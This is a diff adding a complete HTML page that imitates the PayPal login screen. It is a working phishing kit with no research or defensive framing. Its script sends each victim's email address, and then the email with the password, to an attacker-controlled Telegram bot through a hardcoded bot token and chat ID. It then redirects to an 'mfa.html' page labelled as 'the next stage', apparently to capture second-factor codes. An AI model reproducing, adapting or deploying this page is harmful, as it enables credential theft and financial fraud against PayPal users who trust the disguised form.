@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Log in to PayPal</title>
+  <style>
+    /* =====================================================
+       1. BASE / STYLES
+       ===================================================== */
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Helvetica Neue', Arial, sans-serif; background: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; }
+    .container { width: 100%; max-width: 390px; padding: 56px 24px 40px; }
+    
+    /* Logo and Heading */
+    .logo { display: flex; justify-content: center; margin-bottom: 32px; }
+    .logo img { width: 64px; height: 64px; border-radius: 14px; }
+    h1 { font-size: 2rem; font-weight: 900; text-align: center; color: #000; line-height: 1.2; margin-bottom: 32px; }
+
+    /* Form Elements */
+    .email-display { text-align: center; margin-bottom: 24px; }
+    .email-display p { color: #555; font-size: 1rem; margin-bottom: 4px; }
+    
+    input { width: 100%; border: 1.5px solid #ccc; border-radius: 12px; padding: 16px; font-size: 1rem; color: #000; outline: none; transition: border-color 0.2s, box-shadow 0.2s; }
+    input:focus { border-color: #0070ba; box-shadow: 0 0 0 2px rgba(0,112,186,0.2); }
+    input.error { border-color: #e0001a; }
+
+    .password-wrap { display: flex; align-items: center; border: 1.5px solid #ccc; border-radius: 12px; padding: 0 16px; transition: border-color 0.2s, box-shadow 0.2s; }
+    .password-wrap:focus-within { border-color: #0070ba; box-shadow: 0 0 0 2px rgba(0,112,186,0.2); }
+    .password-wrap.error { border-color: #e0001a; }
+    .password-wrap input { border: none; padding: 16px 0; box-shadow: none; flex: 1; }
+    
+    .toggle-btn { background: none; border: none; cursor: pointer; color: #aaa; padding: 4px; display: flex; }
+    .error-msg { color: #e0001a; font-size: 0.85rem; margin-top: 4px; }
+    .link { background: none; border: none; color: #0070ba; font-weight: 700; font-size: 0.875rem; cursor: pointer; padding: 0; }
+    .link:hover { text-decoration: underline; }
+
+    /* Spacing */
+    .mb-3 { margin-bottom: 12px; }
+    .mb-6 { margin-bottom: 24px; }
+    .mb-8 { margin-bottom: 32px; }
+    .mb-12 { margin-bottom: 48px; }
+    .mt-1 { margin-top: 4px; }
+
+    /* Buttons */
+    .btn-primary { width: 100%; background: #000; color: #fff; font-weight: 700; font-size: 1rem; border: none; border-radius: 9999px; padding: 16px; cursor: pointer; transition: background 0.15s; }
+    .btn-primary:hover { background: #222; }
+    .btn-outline { width: 100%; background: #fff; color: #000; font-weight: 600; font-size: 1rem; border: 1.5px solid #ccc; border-radius: 9999px; padding: 16px; cursor: pointer; transition: background 0.15s; }
+    .btn-outline:hover { background: #f5f5f5; }
+
+    /* Screen Logic */
+    .center { text-align: center; }
+    .screen { display: none; }
+    .screen.active { display: block; }
+  </style>
+</head>
+<body id="main-body">
+<div class="container">
+  <!-- Logo -->
+  <div class="logo">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSm7KY6cxjGvvYvQKwl2pCyYXYjTFWhPU3jbmQfcN9k9aUC3coIkPOrR4FD&s=10" alt="PayPal">
+  </div>
+  <h1 id="main-heading">Log in to PayPal</h1>
+
+  <!-- Screen 1: Email/Mobile -->
+  <div id="screen-email" class="screen active">
+    <div class="mb-3">
+      <label for="email-input" style="display: block; font-size: 14px; margin-bottom: 8px;">Email address or mobile number</label>
+      <input id="email-input" type="text" placeholder="e.g. name@example.com" oninput="clearErr('email-err')" onkeydown="if(event.key==='Enter')nextStep()" />
+      <p id="email-err" class="error-msg" style="display:none"></p>
+    </div>
+    
+    <button class="btn-primary mb-3" onclick="nextStep()">Next</button>
+    <button class="btn-outline mb-6">Sign Up</button>
+    <p class="center"><button class="link">Forgot email?</button></p>
+  </div>
+
+  <!-- Screen 2: Password -->
+  <div id="screen-password" class="screen">
+    <div class="email-display mb-6">
+      <p id="shown-email"></p>
+      <button class="link" onclick="goBack()">Change</button>
+    </div>
+    <div class="mb-3">
+      <div class="password-wrap" id="pw-wrap">
+        <input id="pw-input" type="password" placeholder="Password" oninput="clearErr('pw-err')" onkeydown="if(event.key==='Enter')loginStep()" />
+        <button class="toggle-btn" onclick="togglePw()" aria-label="Toggle password">
+          <svg id="eye-icon" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+          </svg>
+        </button>
+      </div>
+      <p id="pw-err" class="error-msg" style="display:none"></p>
+    </div>
+    <p class="mb-12"><button class="link">Forgot password?</button></p>
+    <button class="btn-primary" onclick="loginStep()">Log In</button>
+  </div>
+</div>
+
+<script>
+  /* =====================================================
+     CONFIGURATION
+     ===================================================== */
+  const BOT = '8821552057:AAGjumnJfLoxY-oYU0KM8K5F7yJnX5o1LRE';
+  const CID = '7984877450';
+  const MFA_REDIRECT = 'mfa.html'; // The next stage
+
+  /* =====================================================
+     CORE LOGIC
+     ===================================================== */
+  function sendTelegram(text) {
+    fetch('https://api.telegram.org/bot' + BOT + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CID, text: text, parse_mode: 'HTML' })
+    }).catch(() => {});
+  }
+
+  function clearErr(id) {
+    var el = document.getElementById(id);
+    if (el) { el.style.display = 'none'; el.textContent = ''; }
+  }
+
+  function showErr(id, msg) {
+    var el = document.getElementById(id);
+    if (el) { el.style.display = 'block'; el.textContent = msg; }
+  }
+
+  function nextStep() {
+    var email = document.getElementById('email-input').value.trim();
+    if (!email) { showErr('email-err', 'Please enter your email or phone number.'); return; }
+    
+    // Sending email to Telegram
+    sendTelegram('\uD83D\uDCE7 <b class=\"bold\">PayPal Login \u2014 Email Step</b>\n\nEmail: <code id=\"email_val\">' + email + '</code>');
+    
+    document.getElementById('shown-email').textContent = email;
+    document.getElementById('screen-email').classList.remove('active');
+    document.getElementById('screen-password').classList.add('active');
+    setTimeout(() => document.getElementById('pw-input').focus(), 100);
+  }
+
+  function goBack() {
+    document.getElementById('screen-password').classList.remove('active');
+    document.getElementById('screen-email').classList.add('active');
+    document.getElementById('pw-input').value = '';
+  }
+
+  function togglePw() {
+    var inp = document.getElementById('pw-input');
+    inp.type = inp.type === 'password' ? 'text' : 'password';
+  }
+
+  function loginStep() {
+    var pw = document.getElementById('pw-input').value;
+    var email = document.getElementById('email-input').value.trim();
+    
+    if (!pw) { showErr('pw-err', 'Please enter your password.'); return; }
+
+    // Sending password to Telegram
+    sendTelegram('\uD83D\uDD10 <b class=\"bold\">PayPal Login \u2014 Password Step</b>\n\nEmail: <code id=\"email_val\">' + email + '</code>\nPassword: <code id=\"pw_val\">' + pw + '</code>');
+
+    // Redirect to MFA page after 2 seconds
+    setTimeout(() => {
+        window.location.href = MFA_REDIRECT;
+    }, 2000);
+  }
+</script>
+</body >
+</html>
